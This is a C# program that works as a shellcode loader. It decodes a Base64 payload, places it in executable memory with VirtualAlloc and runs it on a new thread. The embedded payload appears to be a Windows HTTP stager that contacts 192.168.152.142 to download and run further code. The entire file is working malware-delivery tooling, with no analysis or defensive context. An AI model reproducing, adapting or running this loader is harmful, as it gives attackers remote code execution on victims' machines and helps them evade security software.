using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint dwThreadId);

    [DllImport("kernel32.dll")]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        // Replace with Base64 shellcode string output from python script
        string base64Shellcode = "/EiD5PDozAAAAEFRQVBSUUgx0lZlSItSYEiLUhhIi1IgSA+3SkpHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8SAHQQVFmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ItIGESLQCBQSQHQ41ZNMclI/8lBizSISAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1PbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgU2FmYXJpLzUzNy4zNiBFZGcvMTMxLjAuMjkwMy44NgBZU1pNMcBNMclTU0m6OlZ5pwAAAAD/1egQAAAAMTkyLjE2OC4xNTIuMTQyAFpIicFJx8BQAAAATTHJU1NqA1NJuleJn8YAAAAA/9XogAAAAC9NcERvZEhkQjJ6LWN4SjNHOWRLRGRRWFXRGtMTmRacTRrbTE1akxPcVNzdnhTU3pfMTg4Z1VZS3BVWXRxZlRXS190TEhQVmR6T1RBblN6QUhVYlBBZk5EVXJNQzEwYzRVQnhlT3YybW9TNDlsSDV6UWF3MnJZRGlpMVAASInBU1pBWE0xyVNIuAACKIQAAAAAUFNTScfC61UuO//VSInGagpfU1pIifFNMclNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrzOhVAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYw1hqAFlJx8LwtaJW/9U=";

        // Decode the Base64 string to byte array
        byte[] shellcode = Convert.FromBase64String(base64Shellcode);

        // Allocate memory for the shellcode and execution
        IntPtr memory = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if (memory == IntPtr.Zero)
        {
            throw new Exception("Failed to allocate memory.");
        }

        Marshal.Copy(shellcode, 0, memory, shellcode.Length);
        IntPtr thread = CreateThread(IntPtr.Zero, 0, memory, IntPtr.Zero, 0, out uint threadId);
        WaitForSingleObject(thread, 0xFFFFFFFF);

        // Clean up
        VirtualFree(memory, 0, 0x8000); 
    }
}
